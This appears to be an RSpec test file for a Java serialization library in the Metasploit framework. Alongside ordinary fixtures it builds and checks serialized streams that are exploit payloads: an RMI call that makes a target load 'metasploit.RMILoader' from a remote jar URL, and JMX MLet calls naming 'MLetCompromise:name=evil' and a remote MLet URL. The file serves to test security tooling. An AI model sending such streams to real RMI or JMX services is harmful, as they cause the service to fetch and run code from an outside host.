# -*- coding:binary -*-
require 'spec_helper'

require 'rex/java'
require 'stringio'

describe Rex::Java::Serialization::Model::Stream do

  subject(:stream) do
    described_class.new
  end

  let(:easy_object_stream) do
    "\xac\xed\x00\x05\x73\x72\x00\x04" +
    "\x45\x61\x73\x79\x74\x1d\xe1\xbc" +
    "\xbb\x2f\xcb\xaa\x02\x00\x01\x49" +
    "\x00\x03\x53\x53\x4e\x78\x70\x41" +
    "\x42\x43\x44"
  end
  let(:easy_object_stream_io) { StringIO.new(easy_object_stream) }
  let(:easy_object_stream_to_s) {
    <<-EOS
@magic: 0xaced
@version: 5
@contents: [
  NewObject { Easy => { ["int", 1094861636] } }
]
@references: [
  [7e0000] NewClassDesc { Easy, [ SSN (int) ] }
  [7e0001] NewObject { Easy => { ["int", 1094861636] } }
]
    EOS
  }

  let(:char_array_stream) do
    "\xac\xed\x00\x05\x75\x72\x00\x02" +
    "\x5b\x43\xb0\x26\x66\xb0\xe2\x5d" +
    "\x84\xac\x02\x00\x00\x78\x70\x00" +
    "\x00\x00\x02\x00\x61\x00\x62"
  end
  let(:char_array_stream_io) { StringIO.new(char_array_stream) }
  let(:char_array_stream_to_s) {
    <<-EOS
@magic: 0xaced
@version: 5
@contents: [
  NewArray { char, ["97", "98"] }
]
@references: [
  [7e0000] NewClassDesc { [C, [  ] }
  [7e0001] NewArray { char, ["97", "98"] }
]
    EOS
  }

  let(:complex_stream) do
    "\xac\xed\x00\x05\x77\x22\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00" +
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01" +
    "\xf6\xb6\x89\x8d\x8b\xf2\x86\x43\x75\x72\x00\x18\x5b\x4c\x6a\x61" +
    "\x76\x61\x2e\x72\x6d\x69\x2e\x73\x65\x72\x76\x65\x72\x2e\x4f\x62" +
    "\x6a\x49\x44\x3b\x87\x13\x00\xb8\xd0\x2c\x64\x7e\x02\x00\x00\x70" +
    "\x78\x70\x00\x00\x00\x01\x73\x72\x00\x15\x6a\x61\x76\x61\x2e\x72" +
    "\x6d\x69\x2e\x73\x65\x72\x76\x65\x72\x2e\x4f\x62\x6a\x49\x44\xa7" +
    "\x5e\xfa\x12\x8d\xdc\xe5\x5c\x02\x00\x02\x4a\x00\x06\x6f\x62\x6a" +
    "\x4e\x75\x6d\x4c\x00\x05\x73\x70\x61\x63\x65\x74\x00\x15\x4c\x6a" +
    "\x61\x76\x61\x2f\x72\x6d\x69\x2f\x73\x65\x72\x76\x65\x72\x2f\x55" +
    "\x49\x44\x3b\x70\x78\x70\x0d\xc1\x1e\x2a\x94\x5e\x2f\xb2\x73\x72" +
    "\x00\x13\x6a\x61\x76\x61\x2e\x72\x6d\x69\x2e\x73\x65\x72\x76\x65" +
    "\x72\x2e\x55\x49\x44\x0f\x12\x70\x0d\xbf\x36\x4f\x12\x02\x00\x03" +
    "\x53\x00\x05\x63\x6f\x75\x6e\x74\x4a\x00\x04\x74\x69\x6d\x65\x49" +
    "\x00\x06\x75\x6e\x69\x71\x75\x65\x70\x78\x70\x80\x16\x00\x00\x01" +
    "\x49\xb5\xe4\x92\x78\xd2\x4f\xdf\x47\x77\x08\x80\x00\x00\x00\x00" +
    "\x00\x00\x01\x73\x72\x00\x12\x6a\x61\x76\x61\x2e\x72\x6d\x69\x2e" +
    "\x64\x67\x63\x2e\x4c\x65\x61\x73\x65\xb0\xb5\xe2\x66\x0c\x4a\xdc" +
    "\x34\x02\x00\x02\x4a\x00\x05\x76\x61\x6c\x75\x65\x4c\x00\x04\x76" +
    "\x6d\x69\x64\x74\x00\x13\x4c\x6a\x61\x76\x61\x2f\x72\x6d\x69\x2f" +
    "\x64\x67\x63\x2f\x56\x4d\x49\x44\x3b\x70\x78\x70\x00\x00\x00\x00" +
    "\x00\x09\x27\xc0\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x72\x6d\x69" +
    "\x2e\x64\x67\x63\x2e\x56\x4d\x49\x44\xf8\x86\x5b\xaf\xa4\xa5\x6d" +
    "\xb6\x02\x00\x02\x5b\x00\x04\x61\x64\x64\x72\x74\x00\x02\x5b\x42" +
    "\x4c\x00\x03\x75\x69\x64\x71\x00\x7e\x00\x03\x70\x78\x70\x75\x72" +
    "\x00\x02\x5b\x42\xac\xf3\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x70" +
    "\x78\x70\x00\x00\x00\x08\x6b\x02\xc7\x72\x60\x1c\xc7\x95\x73\x71" +
    "\x00\x7e\x00\x05\x80\x01\x00\x00\x01\x49\xb5\xf8\x00\xea\xe9\x62" +
    "\xc1\xc0"
  end
  let(:complex_stream_io) { StringIO.new(complex_stream) }
  let(:complex_stream_to_s) {
    <<-EOS
@magic: 0xaced
@version: 5
@contents: [
  BlockData { [ 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0xf6, 0xb6, 0x89, 0x8d, 0x8b, 0xf2, 0x86, 0x43 ] }
  NewArray { java.rmi.server.ObjID;, ["java.rmi.server.ObjID => { [\\"long\\", 991106561224880050], java.rmi.server.UID => { [\\"short\\", -32746], [\\"long\\", 1416095896184], [\\"int\\", -766517433] } }"] }
  BlockData { [ 0x80, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1 ] }
  NewObject { java.rmi.dgc.Lease => { ["long", 600000], java.rmi.dgc.VMID => { byte, ["107", "2", "-57", "114", "96", "28", "-57", "-107"], 5 => { ["short", -32767], ["long", 1416097169642], ["int", -379403840] } } } }
]
@references: [
  [7e0000] NewClassDesc { [Ljava.rmi.server.ObjID;, [  ] }
  [7e0001] NewArray { java.rmi.server.ObjID;, ["java.rmi.server.ObjID => { [\\"long\\", 991106561224880050], java.rmi.server.UID => { [\\"short\\", -32746], [\\"long\\", 1416095896184], [\\"int\\", -766517433] } }"] }
  [7e0002] NewClassDesc { java.rmi.server.ObjID, [ objNum (long), space (Ljava/rmi/server/UID;) ] }
  [7e0003] Utf { Ljava/rmi/server/UID; }
  [7e0004] NewObject { java.rmi.server.ObjID => { ["long", 991106561224880050], java.rmi.server.UID => { ["short", -32746], ["long", 1416095896184], ["int", -766517433] } } }
  [7e0005] NewClassDesc { java.rmi.server.UID, [ count (short), time (long), unique (int) ] }
  [7e0006] NewObject { java.rmi.server.UID => { ["short", -32746], ["long", 1416095896184], ["int", -766517433] } }
  [7e0007] NewClassDesc { java.rmi.dgc.Lease, [ value (long), vmid (Ljava/rmi/dgc/VMID;) ] }
  [7e0008] Utf { Ljava/rmi/dgc/VMID; }
  [7e0009] NewObject { java.rmi.dgc.Lease => { ["long", 600000], java.rmi.dgc.VMID => { byte, ["107", "2", "-57", "114", "96", "28", "-57", "-107"], 5 => { ["short", -32767], ["long", 1416097169642], ["int", -379403840] } } } }
  [7e000a] NewClassDesc { java.rmi.dgc.VMID, [ addr ([B), uid (0x7e0003) ] }
  [7e000b] Utf { [B }
  [7e000c] NewObject { java.rmi.dgc.VMID => { byte, ["107", "2", "-57", "114", "96", "28", "-57", "-107"], 5 => { ["short", -32767], ["long", 1416097169642], ["int", -379403840] } } }
  [7e000d] NewClassDesc { [B, [  ] }
  [7e000e] NewArray { byte, ["107", "2", "-57", "114", "96", "28", "-57", "-107"] }
  [7e000f] NewObject { 5 => { ["short", -32767], ["long", 1416097169642], ["int", -379403840] } }
]
    EOS
  }

  let(:rmi_call) do
    "\xac\xed\x00\x05\x77\x22\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00" +
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
    "\xf6\xb6\x89\x8d\x8b\xf2\x86\x43\x75\x72\x00\x18\x5b\x4c\x6a\x61" +
    "\x76\x61\x2e\x72\x6d\x69\x2e\x73\x65\x72\x76\x65\x72\x2e\x4f\x62" +
    "\x6a\x49\x44\x3b\x87\x13\x00\xb8\xd0\x2c\x64\x7e\x02\x00\x00\x70" +
    "\x78\x70\x00\x00\x00\x00\x77\x08\x00\x00\x00\x00\x00\x00\x00\x00" +
    "\x73\x72\x00\x14\x6d\x65\x74\x61\x73\x70\x6c\x6f\x69\x74\x2e\x52" +
    "\x4d\x49\x4c\x6f\x61\x64\x65\x72\xa1\x65\x44\xba\x26\xf9\xc2\xf4" +
    "\x02\x00\x00\x74\x00\x30\x68\x74\x74\x70\x3a\x2f\x2f\x31\x37\x32" +
    "\x2e\x31\x36\x2e\x31\x35\x38\x2e\x31\x3a\x38\x30\x38\x30\x2f\x35" +
    "\x71\x4f\x45\x37\x59\x52\x76\x43\x32\x53\x62\x2f\x65\x49\x64\x45" +
    "\x44\x70\x2e\x6a\x61\x72\x78\x70\x77\x01\x00"
  end

  let(:mbean_call) do
    "\xac\xed\x00\x05\x77\x22\x7b\xb5\x91\x73\x69\x12\x77\xcb\x4a\x7d" +
    "\x3f\x10\x00\x00\x01\x4a\xe3\xed\x2f\x53\x81\x03\xff\xff\xff\xff" +
    "\x60\x73\xb3\x36\x1f\x37\xbd\xc2\x73\x72\x00\x1b\x6a\x61\x76\x61" +
    "\x78\x2e\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2e\x4f\x62\x6a" +
    "\x65\x63\x74\x4e\x61\x6d\x65\x0f\x03\xa7\x1b\xeb\x6d\x15\xcf\x03" +
    "\x00\x00\x70\x78\x70\x74\x00\x1d\x4d\x4c\x65\x74\x43\x6f\x6d\x70" +
    "\x72\x6f\x6d\x69\x73\x65\x3a\x6e\x61\x6d\x65\x3d\x65\x76\x69\x6c" +
    "\x2c\x69\x64\x3d\x31\x78\x70"
  end

  let(:marshalled_argument) do
    "\xac\xed\x00\x05\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c" +
    "\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10" +
    "\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x01\x74\x00\x1f\x68" +
    "\x74\x74\x70\x3a\x2f\x2f\x31\x37\x32\x2e\x31\x36\x2e\x31\x35\x38" +
    "\x2e\x31\x33\x32\x3a\x34\x31\x34\x31\x2f\x6d\x6c\x65\x74"
  end

  describe ".new" do
    it "Rex::Java::Serialization::Model::Stream" do
      expect(stream).to be_a(Rex::Java::Serialization::Model::Stream)
    end

    it "initializes magic with java serialized stream signature" do
      expect(stream.magic).to eq(Rex::Java::Serialization::STREAM_MAGIC)
    end

    it "initializes version with java serialized stream default version " do
      expect(stream.version).to eq(Rex::Java::Serialization::STREAM_VERSION)
    end

    it "initializes references as empty array " do
      expect(stream.references).to be_empty
    end

    it "initializes stream to nil by default" do
      expect(stream.stream).to be_nil
    end
  end

  describe "#decode" do
    context "when deserializing a simple Object stream" do
      it "deserializes an Stream" do
        expect(stream.decode(easy_object_stream_io)).to be_a(Rex::Java::Serialization::Model::Stream)
      end

      it "deserializes the signature correctly" do
        stream.decode(easy_object_stream_io)
        expect(stream.magic).to eq(Rex::Java::Serialization::STREAM_MAGIC)
      end

      it "deserializes all the contents" do
        stream.decode(easy_object_stream_io)
        expect(stream.contents.length).to eq(1)
      end

      it "deserializes a simple object correctly" do
        stream.decode(easy_object_stream_io)
        expect(stream.contents[0]).to be_an(Rex::Java::Serialization::Model::NewObject)
      end
    end

    context "when deserializing a char array" do
      it "deserializes an Stream" do
        expect(stream.decode(char_array_stream_io)).to be_a(Rex::Java::Serialization::Model::Stream)
      end

      it "deserializes the char array correctly" do
        stream.decode(char_array_stream_io)
        expect(stream.contents[0]).to be_an(Rex::Java::Serialization::Model::NewArray)
      end
    end

    context "when deserializing a complex stream with references" do
      it "deserializes an Stream" do
        expect(stream.decode(complex_stream_io)).to be_a(Rex::Java::Serialization::Model::Stream)
      end

      it "deserializes all the contents in the Stream" do
        stream.decode(complex_stream_io)
        expect(stream.contents.length).to eq(4)
      end

      it "deserializes object contents" do
        stream.decode(complex_stream_io)
        expect(stream.contents[3]).to be_a(Rex::Java::Serialization::Model::NewObject)
      end
    end
  end

  describe "#to_s" do
    it "prints a simple Object stream" do
      stream.decode(easy_object_stream_io)
      expect(stream.to_s).to eq(easy_object_stream_to_s)
    end

    it "prints a char array stream" do
      stream.decode(char_array_stream_io)
      expect(stream.to_s).to eq(char_array_stream_to_s)
    end

    it "prints a complex stream with references" do
      stream.decode(complex_stream_io)
      expect(stream.to_s).to eq(complex_stream_to_s)
    end
  end

  describe "#encode" do
    context "when serializing a simple Object stream" do
      it "serializes the Stream" do
        new_class_desc = Rex::Java::Serialization::Model::NewClassDesc.new
        new_class_desc.class_name = Rex::Java::Serialization::Model::Utf.new(nil, 'Easy')
        new_class_desc.serial_version = 0x741de1bcbb2fcbaa
        new_class_desc.flags = 2
        field = Rex::Java::Serialization::Model::Field.new
        field.type = 'int'
        field.name = Rex::Java::Serialization::Model::Utf.new(nil, 'SSN')
        new_class_desc.fields << field
        new_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new
        new_class_desc.class_annotation.contents << Rex::Java::Serialization::Model::EndBlockData.new
        new_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new
        new_class_desc.super_class.description = Rex::Java::Serialization::Model::NullReference.new

        new_object = Rex::Java::Serialization::Model::NewObject.new
        new_object.class_desc = Rex::Java::Serialization::Model::ClassDesc.new
        new_object.class_desc.description = new_class_desc
        new_object.class_data = [['int', 0x41424344]]

        stream.contents << new_object
        expect(stream.encode.unpack("C*")).to eq(easy_object_stream.unpack("C*"))
      end
    end

    context "when serializing a char array" do
      it "serializes the Stream" do
        new_class_desc = Rex::Java::Serialization::Model::NewClassDesc.new
        new_class_desc.class_name = Rex::Java::Serialization::Model::Utf.new(nil, '[C')
        new_class_desc.serial_version = 0xb02666b0e25d84ac
        new_class_desc.flags = 2
        new_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new
        new_class_desc.class_annotation.contents << Rex::Java::Serialization::Model::EndBlockData.new
        new_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new
        new_class_desc.super_class.description = Rex::Java::Serialization::Model::NullReference.new

        new_array = Rex::Java::Serialization::Model::NewArray.new
        new_array.array_description = Rex::Java::Serialization::Model::ClassDesc.new
        new_array.array_description.description = new_class_desc
        new_array.type = 'char'
        new_array.values = [97, 98]

        stream.contents << new_array
        expect(stream.encode.unpack("C*")).to eq(char_array_stream.unpack("C*"))
      end
    end

    context "when reserializing a complex stream" do
      it "reserializes the original stream" do
        stream.decode(complex_stream_io)
        expect(stream.encode.unpack("C*")).to eq(complex_stream.unpack("C*"))
      end
    end

    context "when serializing a Java RMI call" do
      it "serializes the stream correctly" do
        block_data = Rex::Java::Serialization::Model::BlockData.new
        block_data.contents = "\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf6\xb6\x89\x8d\x8b\xf2\x86\x43"
        block_data.length = block_data.contents.length

        stream.contents << block_data

        new_array_annotation = Rex::Java::Serialization::Model::Annotation.new
        new_array_annotation.contents = [
            Rex::Java::Serialization::Model::NullReference.new,
            Rex::Java::Serialization::Model::EndBlockData.new
        ]

        new_array_super = Rex::Java::Serialization::Model::ClassDesc.new
        new_array_super.description = Rex::Java::Serialization::Model::NullReference.new

        new_array_desc = Rex::Java::Serialization::Model::NewClassDesc.new
        new_array_desc.class_name =  Rex::Java::Serialization::Model::Utf.new(nil, '[Ljava.rmi.server.ObjID;')
        new_array_desc.serial_version = 0x871300b8d02c647e
        new_array_desc.flags = 2
        new_array_desc.fields = []
        new_array_desc.class_annotation = new_array_annotation
        new_array_desc.super_class = new_array_super

        array_desc = Rex::Java::Serialization::Model::ClassDesc.new
        array_desc.description = new_array_desc

        new_array = Rex::Java::Serialization::Model::NewArray.new
        new_array.type = 'java.rmi.server.ObjID;'
        new_array.values = []
        new_array.array_description = array_desc

        stream.contents << new_array
        stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, "\x00\x00\x00\x00\x00\x00\x00\x00")

        new_class_desc = Rex::Java::Serialization::Model::NewClassDesc.new
        new_class_desc.class_name = Rex::Java::Serialization::Model::Utf.new(nil, 'metasploit.RMILoader')
        new_class_desc.serial_version = 0xa16544ba26f9c2f4
        new_class_desc.flags = 2
        new_class_desc.fields = []
        new_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new
        new_class_desc.class_annotation.contents = [
          Rex::Java::Serialization::Model::Utf.new(nil, 'http://172.16.158.1:8080/5qOE7YRvC2Sb/eIdEDp.jar'),
          Rex::Java::Serialization::Model::EndBlockData.new
        ]
        new_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new
        new_class_desc.super_class.description = Rex::Java::Serialization::Model::NullReference.new

        new_object = Rex::Java::Serialization::Model::NewObject.new
        new_object.class_desc = Rex::Java::Serialization::Model::ClassDesc.new
        new_object.class_desc.description = new_class_desc
        new_object.class_data = []

        stream.contents << new_object

        stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, "\x00")

        expect(stream.encode).to eq(rmi_call)
      end
    end

    context "when serializing a MBeanServerConnection.getObjectInstance call data" do
      it "serializes the stream correctly" do
        block_data = Rex::Java::Serialization::Model::BlockData.new
        block_data.contents = "\x7b\xb5\x91\x73\x69\x12\x77\xcb\x4a\x7d\x3f\x10\x00\x00\x01\x4a\xe3\xed\x2f\x53\x81\x03"
        block_data.contents << "\xff\xff\xff\xff\x60\x73\xb3\x36\x1f\x37\xbd\xc2"
        block_data.length = block_data.contents.length

        stream.contents << block_data

        new_class_desc = Rex::Java::Serialization::Model::NewClassDesc.new
        new_class_desc.class_name = Rex::Java::Serialization::Model::Utf.new(nil, 'javax.management.ObjectName')
        new_class_desc.serial_version = 0xf03a71beb6d15cf
        new_class_desc.flags = 3
        new_class_desc.fields = []
        new_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new
        new_class_desc.class_annotation.contents = [
            Rex::Java::Serialization::Model::NullReference.new,
            Rex::Java::Serialization::Model::EndBlockData.new
        ]
        new_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new
        new_class_desc.super_class.description = Rex::Java::Serialization::Model::NullReference.new

        new_object = Rex::Java::Serialization::Model::NewObject.new
        new_object.class_desc = Rex::Java::Serialization::Model::ClassDesc.new
        new_object.class_desc.description = new_class_desc
        new_object.class_data = []

        stream.contents << new_object
        stream.contents << Rex::Java::Serialization::Model::Utf.new(nil, 'MLetCompromise:name=evil,id=1')
        stream.contents << Rex::Java::Serialization::Model::EndBlockData.new
        stream.contents << Rex::Java::Serialization::Model::NullReference.new

        expect(stream.encode).to eq(mbean_call)

      end
    end

    context "when serializing a marshalled argument" do
      it "serializes the stream correctly" do
        stream = Rex::Java::Serialization::Model::Stream.new

        new_array_class_desc = Rex::Java::Serialization::Model::NewClassDesc.new
        new_array_class_desc.class_name = Rex::Java::Serialization::Model::Utf.new(nil, '[Ljava.lang.Object;')
        new_array_class_desc.serial_version = 0x90ce589f1073296c
        new_array_class_desc.flags = 2
        new_array_class_desc.fields = []
        new_array_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new
        new_array_class_desc.class_annotation.contents = [
          Rex::Java::Serialization::Model::EndBlockData.new
        ]
        new_array_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new
        new_array_class_desc.super_class.description = Rex::Java::Serialization::Model::NullReference.new

        new_array = Rex::Java::Serialization::Model::NewArray.new
        new_array.array_description = Rex::Java::Serialization::Model::ClassDesc.new
        new_array.array_description.description = new_array_class_desc
        new_array.type = 'java.lang.Object;'
        new_array.values = [
          Rex::Java::Serialization::Model::Utf.new(nil, 'http://172.16.158.132:4141/mlet')
        ]

        stream.contents << new_array

        expect(stream.encode).to eq(marshalled_argument)
      end
    end

  end

end